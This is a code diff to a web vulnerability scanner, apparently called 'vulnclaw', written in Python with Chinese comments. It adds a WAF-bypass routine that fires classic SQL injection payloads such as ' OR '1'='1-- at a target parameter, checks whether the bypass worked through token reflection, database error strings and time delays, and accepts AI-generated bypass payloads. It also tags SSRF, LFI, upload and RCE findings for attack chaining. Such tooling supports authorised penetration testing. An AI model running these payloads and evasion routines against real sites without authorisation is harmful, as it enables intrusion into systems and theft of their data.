@@ -17,11 +17,13 @@ import re
 from abc import ABC, abstractmethod
 from urllib.parse import urlparse, parse_qs
 from collections import UserDict
+from typing import Dict, List, Optional, Tuple
 
 from vulnclaw.core.logger import logger
 from vulnclaw.core.settings import settings
 from vulnclaw.core.utils import build_attack_url, async_get, obfuscate_payload
-from typing import Dict, List, Optional, Tuple
+from vulnclaw.core.detectors.spa_detector import SpaFingerprintDetector
+from vulnclaw.core.reflective_validator import ReflectiveValidator
 
 
 def build_curl_command(url: str, method: str = "GET", data=None, headers: Optional[Dict] = None) -> str:
@@ -52,6 +54,34 @@ def enrich_finding(finding: Dict, method: str = "GET", headers: Optional[Dict] =
             steps.append(f"2. 在参数 {param} 注入恶意载荷，观察响应是否符合漏洞特征（见上方证据）。")
         steps.append("3. 对比正常/恶意请求的响应差异，确认漏洞可复现。")
         f["reproduction_steps"] = "\n".join(steps)
+    return f
+
+
+def annotate_chain_info(finding: Dict, url: str, param: str) -> Dict:
+    """S2.1: 为 finding 附加结构化链信息（HTTP 状态/可控点/回显特征/可链性）。
+
+    跨引擎攻击链路由（S2.2 chain_router）消费此字段：
+      - SSRF -> 内网探测 / Redis 未授权
+      - 文件上传 / LFI -> 可执行文件 -> RCE 链
+    统一在 V100 orchestrator 的引擎结果后处理阶段调用，各引擎无需各自实现。
+    """
+    f = dict(finding or {})
+    ftype = str(f.get("type", "")).lower()
+    evidence = str(f.get("evidence", "") or "")
+    status = f.get("status") or f.get("http_status")
+    chainable = any(
+        k in ftype
+        for k in ("ssrf", "ssr", "upload", "上传", "lfi", "文件包含", "cmdi", "rce", "命令执行")
+    )
+    echo_feature = bool(re.search(r"反射|回显|reflect|echo|状态码|差异", evidence, re.I))
+    f["chain_info"] = {
+        "http_status": status,
+        "controllable_point": "param" if param else "unknown",
+        "echo_feature": echo_feature,
+        "chainable": chainable,
+        "finding_type": f.get("type", ""),
+        "version": 1,
+    }
     return f
 
 
@@ -92,7 +122,7 @@ class BaseEngine(ABC):
 
     NORMAL_RESP_CACHE_TTL: int = 60
 
-    def __init__(self):
+    def __init__(self, spa_detector: Optional[SpaFingerprintDetector] = None):
         self._waf_bypass_cache: Dict[str, List[str]] = {}
         self._payload_cache: Dict[str, List[Tuple[str, str]]] = {}
         self._cache_max_size = getattr(settings, "engine_cache_max_size", 100)
@@ -101,6 +131,8 @@ class BaseEngine(ABC):
         self._waf_bypass_tool = None
         self._normal_resp_cache: Dict[str, Tuple[Tuple[int, str, Dict], float]] = {}
         self._normal_resp_lock = asyncio.Lock()
+        self.spa_detector = spa_detector  # SPA检测器
+        self.reflective_validator = ReflectiveValidator()  # 反射验证器
 
     def _normalize_response(self, text: str) -> str:
         if not text:
@@ -158,6 +190,10 @@ class BaseEngine(ABC):
     ) -> Tuple[bool, float]:
         if threshold is None:
             threshold = self.ab_verify_threshold
+
+        # 检测SPA状态，如果是SPA则降低判定阈值
+        if hasattr(self, 'spa_detector') and self.spa_detector and self.spa_detector.get_spa_status():
+            threshold = max(0.1, threshold * 0.3)  # SPA下降低判定阈值
 
         normal_status, normal_text = normal_resp[0], normal_resp[1]
         attack_status, attack_text = attack_resp[0], attack_resp[1]
@@ -432,6 +468,41 @@ class BaseEngine(ABC):
         if self._waf_bypass_tool is None:
             self._waf_bypass_tool = WAFBypass()
 
+        # 第一阶段：测试经典签名payload是否被拦截
+        classic_payloads = [
+            "' OR '1'='1--",
+            "' OR '1'='1#",
+            "admin'--",
+            "admin'#",
+            "1' OR '1'='1",
+            "1' OR '1'='1#",
+            "1' OR '1'='1--",
+            "1' OR '1'='1#",
+            "1' OR '1'='1--",
+            "1' OR '1'='1#",
+        ]
+        
+        waf_blocked = False
+        for classic_payload in classic_payloads:
+            try:
+                test_url = build_attack_url(url, param, classic_payload, parsed_query)
+                resp = await safe_request(test_url, session, method="GET", timeout=30)
+                if resp is None:
+                    continue
+                
+                attack_status, attack_text = resp[0], resp[1]
+                
+                # 检查是否被WAF拦截（403或特定拦截页面）
+                if attack_status == 403 or (attack_status == 200 and await self._is_waf_block_page(attack_text)):
+                    waf_blocked = True
+                    break
+            except Exception:
+                continue
+        
+        # 如果经典payload未被拦截，直接退出（不是真正的WAF）
+        if not waf_blocked:
+            logger.info(f"⚠️ WAF {waf_type} 未拦截经典签名，跳过绕过测试")
+            return None
 
         logger.info(f"🧠 专项 WAF 绕过启动: {waf_type}")
 
@@ -453,27 +524,28 @@ class BaseEngine(ABC):
                 if not isinstance(attack_text, str):
                     continue
 
-
+                # 第二阶段：检测是否仍有WAF拦截特征
                 waf_detected = await self.detect_waf(attack_text)
-                if waf_detected is None:
-                    has_diff, diff_ratio = self.has_response_diff(
-                        normal_resp,
-                        (attack_status, attack_text, {}),
-                        threshold=0.1
-                    )
-                    if has_diff:
-                        logger.info(f"✅ WAF 绕过成功: {waf_type} -> {bypass_payload[:30]}...")
-                        return {
-                            'url': url,
-                            'parameter': param,
-                            'payload': bypass_payload,
-                            'type': f'{self.name.upper()}-WAF绕过({waf_type})',
-                            'ai_verdict': '高（WAF绕过）',
-                            'confidence': 'high',
-                            'evidence': f'WAF ({waf_type}) 被绕过',
-                            'diff_ratio': diff_ratio,
-                            'waf_bypass': True
-                        }
+                if waf_detected is not None:
+                    continue
+
+                # 第三阶段：验证绕过是否成功（反射token/报错/A-B测试）
+                success = await self._verify_waf_bypass_success(
+                    url, param, bypass_payload, parsed_query, session, normal_resp
+                )
+                
+                if success:
+                    logger.info(f"✅ WAF 绕过成功: {waf_type} -> {bypass_payload[:30]}...")
+                    return {
+                        'url': url,
+                        'parameter': param,
+                        'payload': bypass_payload,
+                        'type': f'{self.name.upper()}-WAF绕过({waf_type})',
+                        'ai_verdict': '高（WAF绕过）',
+                        'confidence': 'high',
+                        'evidence': f'WAF ({waf_type}) 被绕过',
+                        'waf_bypass': True
+                    }
             except Exception as e:
                 logger.debug(f"WAF 绕过测试失败: {e}")
 
@@ -496,30 +568,117 @@ class BaseEngine(ABC):
                     continue
 
                 waf_detected = await self.detect_waf(attack_text)
-                if waf_detected is None:
-                    has_diff, diff_ratio = self.has_response_diff(
-                        normal_resp,
-                        (attack_status, attack_text, {}),
-                        threshold=0.1
-                    )
-                    if has_diff:
-                        logger.info(f"✅ AI 生成的 Payload 绕过 WAF: {ai_payload[:30]}...")
-                        return {
-                            'url': url,
-                            'parameter': param,
-                            'payload': ai_payload,
-                            'type': f'{self.name.upper()}-AI WAF绕过({waf_type})',
-                            'ai_verdict': '高（AI动态绕过）',
-                            'confidence': 'high',
-                            'evidence': f'WAF ({waf_type}) 被 AI 生成 Payload 绕过',
-                            'diff_ratio': diff_ratio,
-                            'waf_bypass': True,
-                            'ai_generated': True
-                        }
+                if waf_detected is not None:
+                    continue
+
+                # 验证AI生成的payload是否成功绕过
+                success = await self._verify_waf_bypass_success(
+                    url, param, ai_payload, parsed_query, session, normal_resp
+                )
+                
+                if success:
+                    logger.info(f"✅ AI 生成的 Payload 绕过 WAF: {ai_payload[:30]}...")
+                    return {
+                        'url': url,
+                        'parameter': param,
+                        'payload': ai_payload,
+                        'type': f'{self.name.upper()}-AI WAF绕过({waf_type})',
+                        'ai_verdict': '高（AI动态绕过）',
+                        'confidence': 'high',
+                        'evidence': f'WAF ({waf_type}) 被 AI 生成 Payload 绕过',
+                        'waf_bypass': True,
+                        'ai_generated': True
+                    }
             except Exception as e:
                 logger.debug(f"AI Payload 测试失败: {e}")
 
         return None
+
+    async def _is_waf_block_page(self, response_text: str) -> bool:
+        """检测响应是否为WAF拦截页面"""
+        waf_patterns = [
+            r"access denied",
+            r"forbidden",
+            r"blocked",
+            r"security",
+            r"firewall",
+            r"protection",
+            r"challenge",
+            r"captcha",
+            r"error",
+            r"unauthorized",
+            r"invalid request",
+        ]
+        
+        for pattern in waf_patterns:
+            if re.search(pattern, response_text, re.IGNORECASE):
+                return True
+        return False
+
+    async def _verify_waf_bypass_success(
+        self,
+        url: str,
+        param: str,
+        payload: str,
+        parsed_query: str,
+        session,
+        normal_resp: Tuple[int, str, Dict]
+    ) -> bool:
+        """验证WAF绕过是否成功（⑥统一反射门槛：12位token反射/报错/A-B测试）
+
+        三段式要求的最后一步：
+        1. 生成唯一12位token，拼接进绕过payload
+        2. 剥离基线后确认token在响应中新出现（反射）
+        3. 或出现SQL报错签名，或A/B延时稳定可复现
+        """
+        # 复用统一反射验证器（12位token + 剥离基线 + body/头/JS 三处检查）
+        reflected, _evidence = await self.reflective_validator.validate_reflection(
+            url, param, payload, parsed_query, session,
+            baseline_resp=normal_resp
+        )
+        # 反射即认为绕过成功（WAF未拦截且目标反映了注入点）
+        if reflected:
+            return True
+
+        try:
+            # 报错签名二次确认（反射缺失但出现数据库错误 = 注入仍成功）
+            test_payload = f"{payload} AND 1=2 AND '1'='"
+            test_url = build_attack_url(url, param, test_payload, parsed_query)
+            resp = await safe_request(test_url, session, method="GET", timeout=30)
+            if resp is None:
+                return False
+            attack_text = resp[1] if resp[1] else ""
+
+            error_patterns = [
+                r"sql syntax",
+                r"mysql|mariadb|postgresql|oracle|sqlite|mssql",
+                r"syntax error|unclosed quotation|unterminated",
+                r"database error|db error",
+                r"exception|fatal|critical",
+            ]
+            for pattern in error_patterns:
+                if re.search(pattern, attack_text, re.IGNORECASE):
+                    return True
+
+            # A-B延时验证：稳定可复现的延时也算绕过成功
+            start_time = time.time()
+            resp = await safe_request(test_url, session, method="GET", timeout=30)
+            if resp is None:
+                return False
+            elapsed_1 = time.time() - start_time
+
+            start_time = time.time()
+            resp = await safe_request(test_url, session, method="GET", timeout=30)
+            if resp is None:
+                return False
+            elapsed_2 = time.time() - start_time
+
+            if elapsed_1 > 3.0 and elapsed_2 > 3.0:
+                return True
+        except Exception:
+            pass
+
+        return False
 
     async def ab_verify(
         self,
